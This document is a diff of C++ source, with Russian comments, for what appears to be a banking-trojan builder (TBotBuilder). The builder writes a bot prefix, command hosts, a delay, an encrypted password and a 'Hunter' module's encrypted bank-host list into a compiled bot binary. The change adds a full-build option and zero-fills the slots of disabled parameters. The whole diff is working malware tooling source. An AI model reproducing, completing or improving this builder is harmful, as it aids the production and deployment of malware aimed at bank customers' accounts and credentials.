@@ -165,12 +165,12 @@ __fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
 
 	// Добавляем основные параметры
 	FPrefix    = new TBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
-	FDelay     = new TBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
 	FHosts     = new TBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
+	FDelay     = new TBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
 	FPassword  = new TBotPassword(this, true, true, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, ParamTitle_Password);
 
 
-        // Hunter
+	// Hunter
 	TBotModule* Module = AddModule(Module_BankHosts);
 	Module->AddParam(true, BOTPARAM_ENCRYPTED_BANKHOSTS, BOTPARAM_BANKHOSTS, MAX_BANKHOSTS_BUF_SIZE, ParamTitle_BankHosts);
 
@@ -214,9 +214,14 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 	ActivateModules();
 }
 
-
-// Функция собирает сборку
- bool __fastcall TBotBuilder::Build()
+//-----------------------------------------------------
+// Build - Функция собирает сборку
+//
+// FullBuild  Параметр указывает, что собирается полная
+//            сборка, при которой свойство параметров
+//            Enabled будет игнорироваться
+//-----------------------------------------------------
+ bool __fastcall TBotBuilder::Build(bool FullBuild)
 {
 	if (FFile->Size == 0)
 		throw Exception(Error_NoSourceFile);
@@ -227,7 +232,9 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 	Message(Status_CheckParams);
 
 	TStringList* Errors = new TStringList();
-	TBotParamStatus Status = CheckParams(Errors);
+
+	TBotParamStatus Status = CheckParams(Errors, FullBuild);
+
 	UnicodeString ErrorText = Errors->Text;
     delete Errors;
 
@@ -266,9 +273,17 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 		for (int i = 0; i < Count; i++)
 		{
 			TBotParam* Param = (TBotParam*)FParams->Items[i];
-			if (!Param->Active) continue;
 
-			WriteParametr(Buf, BufSize, Param);
+			if (Param->Active)
+			{
+				if ((FullBuild || Param->Enabled))
+					WriteParametr(Buf, BufSize, Param);
+				else
+				{
+					// Параметр отключен, забиваем его место нулями
+					Param->WriteEmptyData(Buf, BufSize);
+                }
+			}
 		}
 
 
@@ -293,7 +308,20 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 
 	return true;
 }
+//-----------------------------------------------------------------
 
+//-----------------------------------------------------------------
+int __fastcall TBotBuilder::GetCount()
+{
+	return FParams->Count;
+}
+//-----------------------------------------------------------------
+
+TBotParam* __fastcall TBotBuilder::GetParam(int Index)
+{
+	return (TBotParam*)FParams->Items[Index];
+}
+//-----------------------------------------------------------------
 
 // Функция записывает данные в буфер
 void __fastcall TBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* Param)
@@ -308,14 +336,15 @@ void __fastcall TBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* 
 
 
 // Функция проверяет состояние параметров
-TBotParamStatus __fastcall TBotBuilder::CheckParams(TStrings* Errors)
+TBotParamStatus __fastcall TBotBuilder::CheckParams(TStrings* Errors, bool FullBuild)
 {
 	TBotParamStatus Result = psOk;
 
 	for (int i = 0; i < FParams->Count; i++)
 	{
 		TBotParam* Param = (TBotParam*)FParams->Items[i];
-		if (!Param->Active) continue;
+		bool UseParam = Param->Active && (FullBuild || Param->Enabled);
+		if (!UseParam) continue;
 
 		TBotParamStatus Status = Param->Status();
 		if (Status == psOk) continue;
@@ -652,6 +681,7 @@ __fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypte
 	if (Size == 0)
 		throw Exception("Unknown param size!");
 
+	FEnabled = true;
 	FEncrypted = Encrypted;
 	FOwner = AOwner;
 	FTitle = Title;
@@ -918,7 +948,17 @@ void __fastcall TBotParam::LoadFromStrings(TStrings *Strings)
 bool __fastcall TBotParam::Write(PCHAR Buf, DWORD BufSize)
 {
 	// Функция записывает своё значение в буфер
-    return DoWrite(Buf, BufSize, FData, FSize);
+	return DoWrite(Buf, BufSize, FData, FSize);
+}
+
+bool __fastcall TBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
+{
+	// Функция заполняет нулями своё место в сборке
+	int Pos = Position(Buf, BufSize);
+	if (Pos < 0) return false;
+
+	m_memset(Buf + Pos, 0, FSize);
+	return true;
 }
 
 
@@ -933,8 +973,7 @@ bool __fastcall TBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD 
 {
 	// Ищем позицию
 	int Pos = Position(Buf, BufSize);
-	if (Pos < 0)
-		return false;
+	if (Pos < 0) return false;
 
 	// записываем данные
 	m_memcpy(Buf + Pos, AData, ADataSize);
@@ -986,6 +1025,15 @@ bool __fastcall TBotPassword::Write(PCHAR Buf, DWORD BufSize)
     DoWrite(Buf, BufSize, Key.c_str(), Key.Length());
 }
 
+
+bool __fastcall TBotPassword::WriteEmptyData(PCHAR Buf, DWORD BufSize)
+{
+	int Pos = Position(Buf, BufSize);
+	if (Pos < 0) return false;
+
+	m_memset(Buf + Pos, 0, FRealSize);
+	return true;
+}
 
 //****************************************************************************
 //                             TBotModule
